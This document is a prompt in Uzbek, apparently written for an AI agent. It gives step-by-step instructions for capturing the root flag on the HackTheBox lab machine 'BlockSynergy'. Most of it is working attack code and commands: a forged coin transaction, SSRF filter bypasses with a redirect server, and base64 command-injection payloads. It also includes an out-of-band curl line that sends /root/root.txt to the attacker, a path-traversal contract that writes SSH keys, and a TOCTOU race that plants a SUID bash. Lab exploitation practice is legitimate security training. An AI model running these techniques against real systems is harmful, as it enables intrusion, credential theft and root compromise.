# BlockSynergy (HTB, Linux, Insane) — ROOT FLAG OLISH PROMPTI

## VAZIFA
HackTheBox mashinasi **BlockSynergy** (Linux, Insane) da **root flag** ni ol.
- Target IP: `10.129.246.255` (HTB VPN allaqachon ulangan; `ping` javob beradi)
- Maqsad: `/root/root.txt` mazmunini o'qib ko'rsatish
- User flag allaqachon olingan — faqat **root** kerak

## MAJBURIY QOIDALAR
1. Har bir qadam natijasini tekshir, ko'r-ko'rna davom etma.
2. Internetdagi writeup'lar bu instansiyaga **to'liq mos emas** — quyidagi **empirik faktlar**ga tayan.
3. `/nodes` ro'yxati bir necha daqiqada tozalanadi → "register → darhol trigger" ni **bitta zanjirda** bajar.
4. `POST /broadcast_transaction` ga buzuq/bo'sh JSON yuborma (tx pool buziladi, keyin hamma sahifa 500 bo'ladi).
5. Instansiya reset bo'lsa — boshidan (recon) boshlash kerak.

---

## 1. RECON (tasdiqlangan)
```
22/tcp   open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
8080/tcp open  http  Werkzeug/3.1.3 Python/3.12.3
                     http-title: BlockSynergy – Decentralized Future
```
Faqat shu ikki port tashqaridan. Ichkarida `127.0.0.1:5000` da ikkinchi Flask app bor (keyin walter shell orqali topiladi).

Ish papkasi: `~/htb/blocksynergy/work`

---

## 2. ENDPOINT XARITASI
```
GET  /                             bosh sahifa (mining hujjati bor)
GET  /blockchain                   hamma bloklar (ochiq)
GET  /mining_data                  blockchain, difficulty, latest_block, pending_transactions
POST /submit_block                 {"block": <blok>}  -> blok qo'shish
POST /broadcast_transaction        JSON tranzaksiya
GET  /nodes                        ro'yxatdan o'tgan node URL lar (JSON)
GET/POST /dashboard/wallet         action=create|load  (fayl maydoni: file)
GET  /dashboard/info|txn|txn_history|pending_txn|api|deposit|withdraw|blockchain
GET  /dashboard/vip/nodes          VIP node boshqaruvi (auth talab)
POST /dashboard/vip/nodes          action=register&node=<URL>
GET  /dashboard/vip/nodes/test_node/<IDX>   SSRF: ro'yxatdagi URL ni GET qilib, javobni qaytaradi
GET  /admin                        -> 403 "Permission Denied"
GET  /admin/nodes/manage           -> 403
GET/POST /admin/nodes/add_node     -> 200 (AUTHSIZ!) forma: action=register&node=
```

---

## 3. VIP OLISH (bajarilgan; reset bo'lsa takrorlang)
```bash
cd ~/htb/blocksynergy/work
T=10.129.246.255

# wallet create + load (fayl maydoni nomi: file)
curl -s -c cookies.txt -X POST http://$T:8080/dashboard/wallet \
     -F "action=create" -F "filename=mywallet" -o mywallet.json
curl -s -b cookies.txt -c cookies.txt -X POST http://$T:8080/dashboard/wallet \
     -F "action=load" -F "file=@mywallet.json" -o load.html

PUB=$(python3 -c "import json;print(json.load(open('mywallet.json'))['public_key'])")

# soxta "reward" tranzaksiya -> o'zimizga 20 coin
curl -s -b cookies.txt -c cookies.txt -X POST http://$T:8080/broadcast_transaction \
  -H 'Content-Type: application/json' \
  -d "{\"sender\":\"Blockchain_Reward\",\"receiver\":\"$PUB\",\"amount\":20,\"signature\":\"Blockchain\",\"timestamp\":\"$(date -u '+%Y-%m-%d %H:%M:%S')\"}"
# javob: "Added!"
```
Muhim: app balansni **pending tranzaksiyalar bilan birga** hisoblaydi → VIP darhol ochiladi.

---

## 4. ⚠️ URL VALIDATSIYA XATTI-HARAKATI (eng muhim empirik fakt)
Node URL validatsiyasi (register) shunday ishlaydi:

**QABUL QILADI:**
```
http://10.129.246.255:8080/            (bosh sahifa)
http://10.129.246.255:8080/admin
http://1.1.1.1/
http://0.0.0.1:8080/admin
http://10.129.246.255:8080;id          <-- portdan keyin SHELL METABELGILARI O'TADI!
http://10.129.246.255:8080;echo${IFS}...|base64${IFS}-d|bash;x
```

**RAD ETADI ("Invalid URL or localhost!"):**
```
127.0.0.1   127.0.0.2   127.0.0.3   127.1   127.0.1   127.000.000.001
0.0.0.0     0           0x7f.1      0177.0.0.1     2130706433
[::1]   [::]   [::ffff:127.0.0.1]  (QAYTA TEKSHIR!)
example.com  google.com  scanme.nmap.org  1.1.1.1.nip.io  127.0.0.1.nip.io  7f000001.0a0a0a0a.rbndr.us
va '@' (userinfo) BO'LGAN HAR QANDAY URL
```
**Xulosa:** filtr host'ni IPv4 resolve qiladi va **loopback (127/8)** hamda **unspecified (0.0.0.0)** ni bloklaydi. Box'da **DNS yo'q** (hostname'lar resolve bo'lmaydi) → DNS rebinding mumkin emas.

**MUHIM:** `0.0.0.1` filtrdan o'tadi, LEKIN Linux `0.0.0.0/8` ni loopback'ga yo'naltirmaydi → `test_node` "Node not reachable or invalid ID!" beradi. (Tasdiqlandi.)

---

## 5. 🔴 BLOKER: loopback'ga SSRF
- `test_node/<IDX>` ro'yxatdagi URL ni `requests.get()` qiladi va javobni qaytaradi.
- `http://10.129.246.255:8080/admin` ga SSRF → **"Permission Denied" (17 bayt)** — ya'ni `/admin` guard `remote_addr == 127.0.0.1` ni talab qiladi.
- Ping injection `/admin/nodes/manage` ichida → uni **faqat loopback'dan** chaqirish kerak.

### BLOKERNI YECHISH YO'LLARI (shu tartibda sina)
**A) IPv6-mapped loopback (eng oson):**
Python `ipaddress` bo'yicha `::ffff:127.0.0.1` ning `is_loopback = False`, lekin ulanish **127.0.0.1 ga tushadi**. Validator buni o'tkazib yuborishi mumkin:
```
http://[::ffff:127.0.0.1]:8080/admin
http://[::ffff:7f00:1]:8080/admin
http://[0:0:0:0:0:ffff:127.0.0.1]:8080/admin
```
Ro'yxatdan o'tkazib ko'r; agar `ACCEPT` bo'lsa → `test_node` → admin panel.

**B) Redirect SSRF (DNS kerak emas, ishonchli):**
1. O'z IP'ingda (HTB VPN IP, masalan `10.10.x.y`) kichik HTTP server ko'tar (`redirector.py`):
```python
import http.server, socketserver, sys
PORT = int(sys.argv[1]); TARGET = sys.argv[2]
class H(http.server.BaseHTTPRequestHandler):
    def _r(self):
        self.send_response(302); self.send_header('Location', TARGET); self.end_headers()
    do_GET = do_HEAD = _r
    def log_message(self, *a): print('[*]', self.address_string(), self.requestline, flush=True)
socketserver.TCPServer(('0.0.0.0', PORT), H).serve_forever()
```
2. `python3 redirector.py 8000 'http://127.0.0.1:8080/admin'`
3. Node sifatida ro'yxatdan o'tkaz: `http://<SENING_IP>:8000/` (loopback emas → filtr o'tadi)
4. `test_node` → box senga GET yuboradi → **302 ni kuzatadi** (`requests` default) → `127.0.0.1:8080/admin` → admin panel!
   (Keyin TARGET ni ping injection URL'iga o'zgartir.)

**C) Boshqa loopback "imlolari"** (A/B ishlamasa): `%31%32%37.0.0.1`, trailing dot, `127.0.0.1%00.x` va h.k.

Tekshirish: `curl -s -b cookies.txt http://$T:8080/dashboard/vip/nodes | wc -c` — >7000 bo'lsa VIP bor (aks holda ~207).

> Wallet import **keypair mosligini tekshiradi** ("Keypair mismatch") — soxta public_key ishlatib bo'lmaydi; faqat o'z kalitingiz + reward tranzaksiya.

---

## 6. COMMAND INJECTION MEXANIKASI (tayyor)
`/admin/nodes/manage?action=ping_node&target=<A>` ichida:
```python
os.system("ping -w 4 " + <A ning netloc qismi>)
```
Ya'ni **`A` netloc** qismiga `;` bilan buyruq qo'shamiz.

Shartlar:
- `A` **node ro'yxatida** bo'lishi shart (handler ro'yxatdan qidiradi) → avval `action=register` bilan qo'sh.
- `A` ning netloc'ida `/` bo'lmasin (u netloc'ni uradi) → buyruqni **base64** qilib, `/` chiqmasligiga ishonch hosil qil.
- Bo'shliq o'rniga `${IFS}`.

**Tayyor A qiymatlari (slash-free base64):**
```
# id + vositalar
http://10.129.246.255:8080;echo${IFS}aWQ7IGhvc3RuYW1lOyB3aGljaCB4eGQgYmFzZTY0IHByaW50ZiB0cg==|base64${IFS}-d|bash;x

# /home/walter/user.txt
http://10.129.246.255:8080;echo${IFS}Y2F0IC9ob21lL3dhbHRlci91c2VyLnR4dA==|base64${IFS}-d|bash;x
```

**Trigger (B) — loopback bypass bilan:**
```
B = http://<LOOPBACK_BYPASS>/admin/nodes/manage?action=ping_node&target=<urlencode(A)>
```
`B` ni ham register qil, keyin `test_node(B)` → javob tanasida buyruq chiqishi bo'ladi.

**Yordamchi skript `inject.sh`:**
```bash
#!/bin/bash
# LB='127.0.0.1:8080' ./inject.sh "<A-URL>"
A="$1"; T="${T:-10.129.246.255}"; LB="${LB:-0.0.0.1:8080}"
B="http://${LB}/admin/nodes/manage?action=ping_node&target=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$A")"
curl -s -b cookies.txt -c cookies.txt -X POST http://$T:8080/dashboard/vip/nodes \
  --data-urlencode "action=register" --data-urlencode "node=$A" -o /dev/null
curl -s -b cookies.txt -c cookies.txt -X POST http://$T:8080/dashboard/vip/nodes \
  --data-urlencode "action=register" --data-urlencode "node=$B" -o /dev/null
curl -s http://$T:8080/nodes -o nodes.json
IDX=$(python3 -c 'import json,sys;a=json.load(open("nodes.json"));m=[i for i,u in enumerate(a) if u==sys.argv[1]];print(m[0] if m else "")' "$B")
[ -z "$IDX" ] && { echo "B ro'yxatga tushmadi"; exit 1; }
curl -s -b cookies.txt "http://$T:8080/dashboard/vip/nodes/test_node/$IDX" -o inj.html
python3 - <<'PY'
import re, html
h = open('inj.html', encoding='utf-8', errors='replace').read()
for p in re.findall(r'<pre[^>]*>(.*?)</pre>', h, re.S):
    print('PRE>', html.unescape(p).strip())
PY
```
Ishlatish: `LB='127.0.0.1:8080' ./inject.sh 'http://10.129.246.255:8080;id'`

> Diqqat: agar handler `os.system` ishlatsa, chiqish HTTP javobida bo'lmasligi mumkin — u holda
> **out-of-band** ishlat: `...;curl${IFS}http://<SENING_IP>:8000/x?d=$(cat${IFS}/root/root.txt)`.
> Redirect serveringiz bor, shuning uchun OOB oson (buyruqni base64 qilib yuboring).


---

## 7. FOOTHOLD'DAN KEYINGI ZANJIR (writeup'lardan, tasdiqlangan tuzilma)

### 7.1 walter → user.txt
Injection bilan: `id` (uid=1000 walter) va `cat /home/walter/user.txt`.

### 7.2 walter → hank (ichki servis, port 5000)
```bash
ss -lntp; curl -s http://127.0.0.1:5000/ | head
```
Manba: `/opt/staging/smart_contracts/{contract.py,dev_app.py,dev_blockchain.py}` (hank sifatida ishlaydi).
Zaiflik: `ContractEngine` **debug `log` hook** — `__meta__.log_file` normalizatsiya qilinmaydi:
```python
logfile = f"/opt/staging/smart_contracts/logs/{file}"; open(logfile,"a").write(content)
```
Zararli contract (`/tmp/hank_contract.json`):
```json
{
  "name": "ssh-bootstrap", "id": 1, "owner": "Developer", "debug": "True",
  "logic": {"mint": "allow"},
  "storage": {"balances": {}, "total_supply": 0},
  "hooks": {"on_mint": "log"},
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": {"on_mint": "\n<SSH_PUBKEY>\n"}
  }
}
```
```bash
ssh-keygen -t ed25519 -f hank_key -N ''
curl -s -c /tmp/c.jar http://127.0.0.1:5000/dashboard >/dev/null
curl -s -b /tmp/c.jar -c /tmp/c.jar -F action=upload_contract \
     -F contract_file=@/tmp/hank_contract.json http://127.0.0.1:5000/dashboard -o /tmp/up.html
grep -q 'Contract loaded' /tmp/up.html
curl -s -b /tmp/c.jar -c /tmp/c.jar -d action=contract_mint -d contract_mint_amount=1 \
     http://127.0.0.1:5000/dashboard -o /tmp/mint.html
ssh -i hank_key -o IdentitiesOnly=yes hank@10.129.246.255
```
(`hank` `developers` guruhida.)

### 7.3 hank → root (restore TOCTOU race)
`pspy64` bilan kuzatiladi: root cron (`*/5 * * * *`) `backup.sh` — `/opt/blocksynergy` ni `tar` qilib FTP'ga `curl -T` yuboradi;
`restore_daemon.sh` esa: `/opt/blocksynergy/restore` faylini ko'rsa → arxivni `/var/restore_work/_opt_blocksynergy.tar.gz` ga yuklaydi → `sha256sum` → **keyin aynan shu faylni root sifatida `tar xvf ... -C /`** qiladi.

TOCTOU: sha256 tugagach, root `tar` ochishidan oldin faylni **atomik `mv`** bilan almashtiramiz.
```bash
# SUID bash -> opt/blocksynergy/.diag
tar --transform 's|.*|opt/blocksynergy/.diag|' --mode=4755 --owner=0 --group=0 -cf suid.tar /bin/bash
touch /opt/blocksynergy/restore          # daemon'ni trigger (katalog developers uchun rwx)
# watcher: /var/restore_work/_opt_blocksynergy.tar.gz hajmi ~11MB da barqarorlashganda mv
/opt/blocksynergy/.diag -p               # euid=0  (-p SHART!)
cat /root/root.txt
```
Watcher mantig'i: `size > 10000000` va ikki tekshiruvda teng → `cp payload $TMP; mv -fT $TMP $F`.
Keyin `/opt/blocksynergy/.diag` `root:root 4755` bo'lishini kut.

---

## 8. MUVAFFAQIYAT MEZONI
- `/root/root.txt` mazmuni o'qilgan va ko'rsatilgan.
- Har bir bosqich chiqishi (buyruq + natija) hisobot qilinadi.

